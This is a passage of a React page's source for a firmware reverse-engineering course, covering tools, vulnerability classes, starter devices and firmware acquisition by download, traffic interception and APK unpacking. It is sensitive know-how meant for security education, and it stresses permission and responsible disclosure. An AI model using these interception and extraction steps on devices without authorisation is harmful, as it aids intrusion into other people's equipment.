                  <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>
                    {item.desc}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            How is Firmware Different from Regular Software?
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            When you reverse engineer a Windows application or an Android app, you're typically dealing with 
            familiar operating systems, standard file formats, and well-documented architectures. Firmware 
            reverse engineering introduces unique challenges:
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              {
                challenge: "Different Processor Architectures",
                explanation: "Instead of x86/x64 (desktop computers), firmware often runs on ARM, MIPS, PowerPC, or even obscure microcontrollers. Each has different instruction sets you'll need to learn.",
                icon: "🔧",
              },
              {
                challenge: "Custom or Minimal Operating Systems",
                explanation: "Many devices run embedded Linux, real-time operating systems (RTOS), or no OS at all—just bare-metal code running directly on the processor.",
                icon: "⚙️",
              },
              {
                challenge: "Proprietary File Formats",
                explanation: "Firmware images often use custom packaging, compression, and encryption. There's no standard '.exe' equivalent—you might encounter SquashFS, JFFS2, UBIFS, or entirely proprietary formats.",
                icon: "📦",
              },
              {
                challenge: "Hardware Interaction",
                explanation: "Sometimes you can't just download firmware—you need physical access to extract it from flash memory chips using specialized tools and hardware interfaces.",
                icon: "🔌",
              },
              {
                challenge: "Limited Documentation",
                explanation: "Unlike major operating systems, embedded devices rarely have public documentation. You're often working blind, figuring out functionality through analysis alone.",
                icon: "📚",
              },
              {
                challenge: "Resource Constraints",
                explanation: "Embedded systems have limited memory and processing power, leading to optimized code that can be harder to understand and debug.",
                icon: "💾",
              },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper
                  sx={{
                    p: 2.5,
                    height: "100%",
                    borderRadius: 2,
                    bgcolor: alpha("#8b5cf6", 0.03),
                    border: `1px solid ${alpha("#8b5cf6", 0.1)}`,
                  }}
                >
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1 }}>
                    {item.icon} {item.challenge}
                  </Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>
                    {item.explanation}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#10b981" }}>
            The Firmware Reverse Engineering Process
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            Firmware analysis typically follows a methodical process. While every device is different, here's 
            the general workflow that analysts follow:
          </Typography>

          <Box sx={{ mb: 4 }}>
            {[
              {
                step: "1",
                title: "Reconnaissance",
                desc: "Research the device: identify the manufacturer, model, chipset, and any publicly available firmware updates or documentation. Check FCC filings for internal photos.",
                color: "#06b6d4",
              },
              {
                step: "2",
                title: "Acquisition",
                desc: "Obtain the firmware—either by downloading from the vendor's website, capturing during an update process, or extracting directly from flash memory chips using hardware tools.",
                color: "#3b82f6",
              },
              {
                step: "3",
                title: "Extraction",
                desc: "Unpack the firmware image to access its contents. Use tools like binwalk to identify and extract embedded filesystems, bootloaders, and kernel images.",
                color: "#8b5cf6",
              },
              {
                step: "4",
                title: "Static Analysis",
                desc: "Examine the extracted files without running them: analyze binaries with disassemblers (Ghidra, IDA), search for hardcoded credentials, review configuration files.",
                color: "#ec4899",
              },
              {
                step: "5",
                title: "Emulation (Optional)",
                desc: "If possible, emulate the firmware using QEMU or Firmadyne. This lets you interact with the system dynamically without needing the physical hardware.",
                color: "#f97316",
              },
              {
                step: "6",
                title: "Dynamic Analysis",
                desc: "If you have the hardware, connect via debug interfaces (UART, JTAG), observe runtime behavior, intercept network traffic, and test for vulnerabilities.",
                color: "#ef4444",
              },
              {
                step: "7",
                title: "Vulnerability Research",
                desc: "Look for security issues: command injection, buffer overflows, authentication bypasses, insecure update mechanisms, and exposed debug interfaces.",
                color: "#dc2626",
              },
              {
                step: "8",
                title: "Documentation & Disclosure",
                desc: "Document your findings thoroughly and follow responsible disclosure practices if you've discovered vulnerabilities.",
                color: "#22c55e",
              },
            ].map((item, idx) => (
              <Paper
                key={idx}
                sx={{
                  p: 2.5,
                  mb: 2,
                  borderRadius: 2,
                  bgcolor: alpha(item.color, 0.03),
                  border: `1px solid ${alpha(item.color, 0.15)}`,
                  borderLeft: `4px solid ${item.color}`,
                }}
              >
                <Box sx={{ display: "flex", alignItems: "flex-start", gap: 2 }}>
                  <Chip
                    label={item.step}
                    size="small"
                    sx={{
                      bgcolor: item.color,
                      color: "white",
                      fontWeight: 700,
                      minWidth: 32,
                    }}
                  />
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 0.5 }}>
                      {item.title}
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>
                      {item.desc}
                    </Typography>
                  </Box>
                </Box>
              </Paper>
            ))}
          </Box>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
            Essential Tools for Firmware Analysis
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            Firmware reverse engineering requires both <strong>software tools</strong> for analysis and 
            <strong>hardware tools</strong> for physical extraction and debugging. Here's an overview of what 
            you'll encounter as you learn:
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            <Grid item xs={12} md={6}>
              <Paper
                sx={{
                  p: 3,
                  height: "100%",
                  borderRadius: 3,
                  bgcolor: alpha("#3b82f6", 0.03),
                  border: `1px solid ${alpha("#3b82f6", 0.1)}`,
                }}
              >
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                  💻 Software Tools
                </Typography>
                <List dense>
                  {[
                    { name: "Binwalk", desc: "Firmware analysis and extraction" },
                    { name: "Ghidra / IDA Pro", desc: "Disassembly and decompilation" },
                    { name: "Radare2 / Cutter", desc: "Open-source reverse engineering" },
                    { name: "QEMU", desc: "Processor emulation" },
                    { name: "Firmadyne", desc: "Automated firmware emulation" },
                    { name: "Jefferson / unsquashfs", desc: "Filesystem extraction" },
                    { name: "Strings / hexdump", desc: "Basic binary analysis" },
                    { name: "Wireshark", desc: "Network traffic analysis" },
                  ].map((tool, idx) => (
                    <ListItem key={idx} sx={{ py: 0.5 }}>
                      <ListItemIcon sx={{ minWidth: 28 }}>
                        <CheckCircleIcon sx={{ fontSize: 16, color: "#3b82f6" }} />
                      </ListItemIcon>
                      <ListItemText
                        primary={<Typography variant="body2"><strong>{tool.name}</strong> - {tool.desc}</Typography>}
                      />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
            <Grid item xs={12} md={6}>
              <Paper
                sx={{
                  p: 3,
                  height: "100%",
                  borderRadius: 3,
                  bgcolor: alpha("#f97316", 0.03),
                  border: `1px solid ${alpha("#f97316", 0.1)}`,
                }}
              >
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f97316" }}>
                  🔧 Hardware Tools
                </Typography>
                <List dense>
                  {[
                    { name: "USB-UART Adapters", desc: "Serial console access" },
                    { name: "Bus Pirate", desc: "Multi-protocol interface tool" },
                    { name: "CH341A Programmer", desc: "SPI flash chip reader" },
                    { name: "JTAG Debuggers", desc: "J-Link, ST-Link, OpenOCD" },
                    { name: "Logic Analyzer", desc: "Protocol decoding" },
                    { name: "Multimeter", desc: "Voltage and continuity testing" },
                    { name: "Soldering Equipment", desc: "For chip removal/attachment" },
                    { name: "SOIC Clips", desc: "In-circuit flash reading" },
                  ].map((tool, idx) => (
                    <ListItem key={idx} sx={{ py: 0.5 }}>
                      <ListItemIcon sx={{ minWidth: 28 }}>
                        <CheckCircleIcon sx={{ fontSize: 16, color: "#f97316" }} />
                      </ListItemIcon>
                      <ListItemText
                        primary={<Typography variant="body2"><strong>{tool.name}</strong> - {tool.desc}</Typography>}
                      />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2, mb: 3 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Getting Started on a Budget</AlertTitle>
            <Typography variant="body2">
              You don't need expensive equipment to start learning! Begin with software analysis using free tools 
              (Binwalk, Ghidra, QEMU), download firmware from vendor websites, and practice extraction and analysis. 
              When you're ready for hardware, a USB-UART adapter ($5-10) and a cheap router from a thrift store 
              make a great first project.
            </Typography>
          </Alert>

          <Divider sx={{ my: 4 }} />

          <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
            Common Vulnerabilities in Firmware
          </Typography>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.9, fontSize: "1.05rem" }}>
            Embedded devices are notorious for security issues. As a firmware analyst, you'll frequently 
            encounter these types of vulnerabilities:
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { vuln: "Hardcoded Credentials", desc: "Default passwords, API keys, and certificates embedded in firmware that never change", color: "#ef4444" },
              { vuln: "Command Injection", desc: "User input passed directly to shell commands without sanitization", color: "#f97316" },
              { vuln: "Buffer Overflows", desc: "Memory corruption bugs in C/C++ code running on resource-constrained systems", color: "#dc2626" },
              { vuln: "Insecure Updates", desc: "Firmware updates without signature verification, allowing malicious firmware installation", color: "#8b5cf6" },
              { vuln: "Exposed Debug Interfaces", desc: "UART/JTAG ports left enabled in production, providing shell access", color: "#3b82f6" },
              { vuln: "Weak Cryptography", desc: "Using broken algorithms, hardcoded keys, or improperly implemented crypto", color: "#06b6d4" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper
                  sx={{
                    p: 2,
                    height: "100%",
                    borderRadius: 2,
                    bgcolor: alpha(item.color, 0.05),
                    border: `1px solid ${alpha(item.color, 0.15)}`,
                  }}
                >
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: item.color }}>
                    {item.vuln}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    {item.desc}
                  </Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Legal & Ethical Considerations</AlertTitle>
            <Typography variant="body2">
              Always ensure you have permission before analyzing firmware. Analyzing devices you own is generally 
              legal, but distributing extracted firmware may violate copyright laws. When you find vulnerabilities, 
              follow responsible disclosure—give vendors time to patch before publishing. Many countries have 
              laws protecting security research, but the legal landscape varies. When in doubt, consult with 
              legal counsel familiar with computer security research.
            </Typography>
          </Alert>
        </Paper>

        {/* Course Outline */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 4,
            bgcolor: alpha(theme.palette.background.paper, 0.6),
            border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
          }}
        >
          <Typography variant="h4" sx={{ fontWeight: 800, mb: 1 }}>
            Course Outline
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 4 }}>
            This comprehensive guide covers everything from basics to advanced firmware analysis techniques.
          </Typography>

          <Grid container spacing={3}>
            {outlineSections.map((section, index) => (
              <Grid item xs={12} sm={6} md={4} key={section.id}>
                <Paper
                  id={section.id}
                  component="a"
                  href={`#${section.id}-content`}
                  sx={{
                    p: 3,
                    display: "block",
                    textDecoration: "none",
                    borderRadius: 3,
                    bgcolor: alpha(section.color, 0.03),
                    border: `1px solid ${alpha(section.color, 0.15)}`,
                    transition: "all 0.2s ease",
                    scrollMarginTop: 96,
                    "&:hover": {
                      bgcolor: alpha(section.color, 0.08),
                      transform: "translateY(-2px)",
                      boxShadow: `0 8px 24px ${alpha(section.color, 0.15)}`,
                    },
                  }}
                >
                  <Box sx={{ display: "flex", alignItems: "flex-start", gap: 2 }}>
                    <Box
                      sx={{
                        width: 48,
                        height: 48,
                        borderRadius: 2,
                        bgcolor: alpha(section.color, 0.15),
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        color: section.color,
                        flexShrink: 0,
                      }}
                    >
                      {React.cloneElement(section.icon, { sx: { fontSize: 26 } })}
                    </Box>
                    <Box sx={{ flex: 1, minWidth: 0 }}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 0.5 }}>
                        <Typography variant="subtitle1" sx={{ fontWeight: 700, color: section.color }}>
                          {section.title}
                        </Typography>
                      </Box>
                      <Chip
                        label={section.status}
                        size="small"
                        icon={section.status === "Complete" ? <CheckCircleIcon /> : <RadioButtonUncheckedIcon />}
                        sx={{
                          mb: 1,
                          bgcolor: section.status === "Complete"
                            ? alpha("#22c55e", 0.15)
                            : alpha("#f59e0b", 0.15),
                          color: section.status === "Complete" ? "#22c55e" : "#f59e0b",
                          fontWeight: 600,
                          "& .MuiChip-icon": {
                            color: section.status === "Complete" ? "#22c55e" : "#f59e0b",
                          },
                        }}
                      />
                      <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.6 }}>
                        {section.description}
                      </Typography>
                    </Box>
                  </Box>
                </Paper>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* ==================== SECTION 1: FIRMWARE BASICS ==================== */}
        <Paper
          id="firmware-basics-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#06b6d4", 0.02),
            border: `1px solid ${alpha("#06b6d4", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#06b6d4", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#06b6d4",
              }}
            >
              <DeveloperBoardIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#06b6d4" }}>
                1. Understanding Firmware Basics
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Firmware is the foundational software that controls hardware at the lowest level. Unlike applications 
            that run on an operating system, firmware is stored in non-volatile memory and executes immediately 
            when a device powers on. Understanding firmware architecture is essential for any hardware security researcher.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
            Firmware vs Software vs Hardware
          </Typography>

          <Grid container spacing={2} sx={{ mb: 4 }}>
            {[
              { name: "Hardware", desc: "Physical components: processors, memory chips, circuit boards, sensors", example: "ARM Cortex-M4 MCU, SPI flash chip, PCB", color: "#ef4444" },
              { name: "Firmware", desc: "Permanent software stored in ROM/flash, controls hardware directly", example: "Bootloader, BIOS/UEFI, router OS", color: "#06b6d4" },
              { name: "Software", desc: "Applications running on top of an operating system", example: "Web browser, mobile app, desktop program", color: "#10b981" },
            ].map((item, idx) => (
              <Grid item xs={12} md={4} key={idx}>
                <Paper sx={{ p: 2.5, height: "100%", borderRadius: 2, bgcolor: alpha(item.color, 0.05), border: `1px solid ${alpha(item.color, 0.15)}` }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: item.color, mb: 1 }}>{item.name}</Typography>
                  <Typography variant="body2" sx={{ mb: 1 }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Examples:</strong> {item.example}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
            Common Firmware Components
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`Typical Firmware Image Structure:
┌─────────────────────────────────────────────────┐
│  Bootloader (U-Boot, CFE, RedBoot)              │  ← First code to execute
├─────────────────────────────────────────────────┤
│  Kernel (Linux, VxWorks, ThreadX, bare-metal)   │  ← Operating system core
├─────────────────────────────────────────────────┤
│  Root Filesystem (SquashFS, JFFS2, UBIFS)       │  ← Contains all user-space
│    /bin  - Core binaries (busybox, sh)          │     programs and config
│    /etc  - Configuration files                   │
│    /lib  - Shared libraries                      │
│    /usr  - Applications and utilities            │
│    /var  - Variable data, logs                   │
│    /www  - Web interface files                   │
├─────────────────────────────────────────────────┤
│  NVRAM / Config Partition                        │  ← User settings, passwords
├─────────────────────────────────────────────────┤
│  Calibration / Radio Data (wireless devices)     │  ← Hardware-specific data
└─────────────────────────────────────────────────┘`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
            Common Processor Architectures
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { arch: "ARM", usage: "Most IoT devices, phones, Raspberry Pi", bits: "32/64-bit", notes: "Little-endian, RISC, Thumb mode" },
              { arch: "MIPS", usage: "Routers, embedded Linux devices", bits: "32/64-bit", notes: "Big or little-endian, common in networking" },
              { arch: "x86/x64", usage: "PCs, servers, some industrial", bits: "32/64-bit", notes: "Complex instruction set (CISC)" },
              { arch: "AVR/PIC", usage: "Microcontrollers, Arduino", bits: "8/16-bit", notes: "Simple, limited resources" },
              { arch: "RISC-V", usage: "Emerging IoT, open-source", bits: "32/64-bit", notes: "Open ISA, gaining popularity" },
              { arch: "Xtensa", usage: "ESP32/ESP8266 Wi-Fi chips", bits: "32-bit", notes: "Configurable, used in IoT" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} md={4} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#06b6d4", 0.03), border: `1px solid ${alpha("#06b6d4", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#06b6d4" }}>{item.arch}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem" }}><strong>Used in:</strong> {item.usage}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.8rem" }}><strong>Bits:</strong> {item.bits}</Typography>
                  <Typography variant="caption" color="text.secondary">{item.notes}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Identifying Architecture</AlertTitle>
            <Typography variant="body2">
              Use the <code>file</code> command on extracted binaries to identify architecture:<br />
              <code>file ./bin/busybox</code> → "ELF 32-bit LSB executable, ARM, EABI5..."<br />
              Or check the first bytes: ARM often starts with <code>7F 45 4C 46</code> (ELF magic) followed by architecture flags.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 2: HARDWARE TARGETS ==================== */}
        <Paper
          id="hardware-targets-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#8b5cf6", 0.02),
            border: `1px solid ${alpha("#8b5cf6", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#8b5cf6", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#8b5cf6",
              }}
            >
              <RouterIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#8b5cf6" }}>
                2. Common Hardware Targets
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Firmware reverse engineering applies to virtually any electronic device with embedded software. 
            Each category of device presents unique challenges and opportunities for security research. 
            Here are the most common targets you'll encounter.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            Device Categories
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            {[
              {
                category: "Network Equipment",
                devices: "Routers, switches, firewalls, access points, modems",
                why: "Gateway to networks, often exposed to internet, contain credentials",
                difficulty: "Beginner-Friendly",
                color: "#10b981",
              },
              {
                category: "Consumer IoT",
                devices: "Smart cameras, doorbells, thermostats, speakers, plugs",
                why: "Mass-deployed, often poor security, cloud connectivity",
                difficulty: "Beginner-Friendly",
                color: "#10b981",
              },
              {
                category: "Industrial Control (ICS/SCADA)",
                devices: "PLCs, RTUs, HMIs, sensors, actuators",
                why: "Critical infrastructure, often legacy, long lifecycles",
                difficulty: "Advanced",
                color: "#ef4444",
              },
              {
                category: "Medical Devices",
                devices: "Insulin pumps, pacemakers, imaging equipment, monitors",
                why: "Life-critical, regulatory constraints, sensitive data",
                difficulty: "Advanced",
                color: "#ef4444",
              },
              {
                category: "Automotive",
                devices: "ECUs, infotainment, telematics, ADAS systems",
                why: "Safety-critical, CAN bus networks, OTA updates",
                difficulty: "Intermediate",
                color: "#f59e0b",
              },
              {
                category: "Storage & NAS",
                devices: "Network attached storage, external drives, backup systems",
                why: "Contains sensitive data, web interfaces, often Linux-based",
                difficulty: "Intermediate",
                color: "#f59e0b",
              },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 3, height: "100%", borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03), border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#8b5cf6" }}>{item.category}</Typography>
                    <Chip label={item.difficulty} size="small" sx={{ bgcolor: alpha(item.color, 0.15), color: item.color, fontWeight: 600, fontSize: "0.7rem" }} />
                  </Box>
                  <Typography variant="body2" sx={{ mb: 1 }}><strong>Examples:</strong> {item.devices}</Typography>
                  <Typography variant="body2" color="text.secondary"><strong>Why target:</strong> {item.why}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
            Recommended Starting Targets
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`Best Devices for Learning (cheap, well-documented, good community):

1. TP-Link Routers (TL-WR841N, Archer series)
   - Cheap ($20-30), widely available
   - MIPS or ARM architecture
   - Often have UART exposed
   - OpenWrt community documentation

2. Netgear Routers (R6xxx, R7xxx series)
   - ARM-based, good for learning
   - Web interface vulnerabilities common
   - Firmware freely downloadable

3. D-Link Cameras (DCS series)
   - ARM processors
   - Often have hardcoded credentials
   - Cloud integration to analyze

4. Raspberry Pi (for practice)
   - ARM architecture
   - Full control, no risk
   - Great for learning ARM assembly

5. ESP32/ESP8266 Development Boards
   - Xtensa architecture
   - Wi-Fi/Bluetooth analysis
   - Open-source SDKs available

Where to Get Devices:
- Thrift stores / Goodwill ($2-10)
- eBay "for parts" listings
- Amazon Warehouse deals
- Old equipment from work/friends`}
            </Typography>
          </Paper>

          <Alert severity="success" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Research Before Buying</AlertTitle>
            <Typography variant="body2">
              Before purchasing a device for research, check if firmware is available online, search for existing 
              teardowns and FCC filings (fcc.gov/oet/ea/fccid), and look for CVE history. Devices with known 
              vulnerabilities are great for learning because you can verify your findings.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 3: ACQUISITION METHODS ==================== */}
        <Paper
          id="acquisition-methods-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#10b981", 0.02),
            border: `1px solid ${alpha("#10b981", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
            <Box
              sx={{
                width: 56,
                height: 56,
                borderRadius: 2,
                bgcolor: alpha("#10b981", 0.15),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "#10b981",
              }}
            >
              <DownloadIcon sx={{ fontSize: 32 }} />
            </Box>
            <Box>
              <Typography variant="h5" sx={{ fontWeight: 800, color: "#10b981" }}>
                3. Firmware Acquisition Methods
              </Typography>
              <Chip label="Complete" size="small" sx={{ mt: 0.5, bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
            </Box>
          </Box>

          <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
            Before you can analyze firmware, you need to obtain it. There are several methods ranging from 
            simple downloads to hardware-based extraction. Start with the easiest methods and escalate to 
            hardware extraction only when necessary.
          </Typography>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#10b981" }}>
            Method 1: Direct Download (Easiest)
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Many vendors provide firmware downloads on their support sites

Common Download Locations:
- Vendor support/download pages
- FTP servers (ftp.dlink.com, ftp.netgear.com)
- GitHub repositories (for open-source projects)
- Archive.org (for discontinued products)

Search Techniques:
- Google: "site:support.vendor.com firmware download"
- Google: "[model number] firmware .bin"
- FCC ID search → internal photos + sometimes firmware

Example Download:
$ wget https://support.netgear.com/firmware/R7000-V1.0.11.116.zip
$ unzip R7000-V1.0.11.116.zip
$ file R7000-V1.0.11.116.chk
R7000-V1.0.11.116.chk: data  # Often just raw binary`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#10b981" }}>
            Method 2: Network Capture (During Update)
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# Intercept firmware during OTA (Over-The-Air) updates

Setup:
1. Configure device to use your proxy (Burp Suite, mitmproxy)
2. Install custom CA certificate on device (if HTTPS)
3. Trigger firmware update check
4. Capture downloaded firmware file

Using mitmproxy:
$ mitmproxy --mode transparent --showhost

Using tcpdump (if update is HTTP):
$ tcpdump -i eth0 -w firmware_capture.pcap port 80

Extract from pcap:
$ tcpflow -r firmware_capture.pcap
# Look for binary files in output

Common Update URLs:
- http://update.vendor.com/firmware/[model]/latest.bin
- https://api.vendor.com/v1/devices/[id]/firmware`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#10b981" }}>
            Method 3: Mobile App Extraction
          </Typography>

          <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "background.default" }}>
            <Typography variant="body2" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.85rem", overflow: "auto" }}>
{`# IoT devices often have companion apps with embedded firmware

Android APK Analysis:
$ apktool d companion_app.apk
$ find . -name "*.bin" -o -name "*.fw" -o -name "*.img"
$ strings ./assets/firmware.bin | head -50

Common locations in APKs:
- assets/
- res/raw/
- lib/armeabi-v7a/ (native libraries may contain firmware)

iOS IPA Analysis:
$ unzip app.ipa
$ find Payload/ -name "*.bin" -o -name "*.fw"

API Endpoint Discovery:
$ grep -r "firmware" ./smali/  # Look for download URLs
$ grep -r "update" ./smali/`}
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#10b981" }}>
            Method 4: Hardware Extraction (When All Else Fails)
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { method: "UART Console", desc: "Access bootloader, dump via serial commands", difficulty: "Easy", tools: "USB-UART adapter, terminal" },
              { method: "JTAG/SWD", desc: "Direct memory access via debug interface", difficulty: "Medium", tools: "J-Link, OpenOCD, ST-Link" },
              { method: "SPI Flash Reading", desc: "Read flash chip directly with programmer", difficulty: "Medium", tools: "CH341A, Bus Pirate, SOIC clip" },
              { method: "Chip-Off", desc: "Desolder chip, read in external programmer", difficulty: "Hard", tools: "Hot air station, programmer" },
            ].map((item, idx) => (
              <Grid item xs={12} sm={6} key={idx}>
                <Paper sx={{ p: 2, height: "100%", borderRadius: 2, bgcolor: alpha("#10b981", 0.03), border: `1px solid ${alpha("#10b981", 0.1)}` }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#10b981" }}>{item.method}</Typography>
                  <Typography variant="body2" sx={{ fontSize: "0.85rem", mb: 0.5 }}>{item.desc}</Typography>
                  <Typography variant="caption" color="text.secondary"><strong>Difficulty:</strong> {item.difficulty}</Typography><br />
                  <Typography variant="caption" color="text.secondary"><strong>Tools:</strong> {item.tools}</Typography>
                </Paper>
              </Grid>
            ))}
          </Grid>

          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle sx={{ fontWeight: 700 }}>Try Software Methods First!</AlertTitle>
            <Typography variant="body2">
              Hardware extraction takes time, requires equipment, and risks damaging the device. Always exhaust 
              software-based methods first. Check vendor sites, search the internet, analyze mobile apps, and 
              capture network traffic before reaching for the soldering iron.
            </Typography>
          </Alert>
        </Paper>

        {/* ==================== SECTION 4: HARDWARE INTERFACES ==================== */}
        <Paper
          id="hardware-interfaces-content"
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#f97316", 0.02),
            border: `1px solid ${alpha("#f97316", 0.1)}`,
            scrollMarginTop: 96,
          }}
        >
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
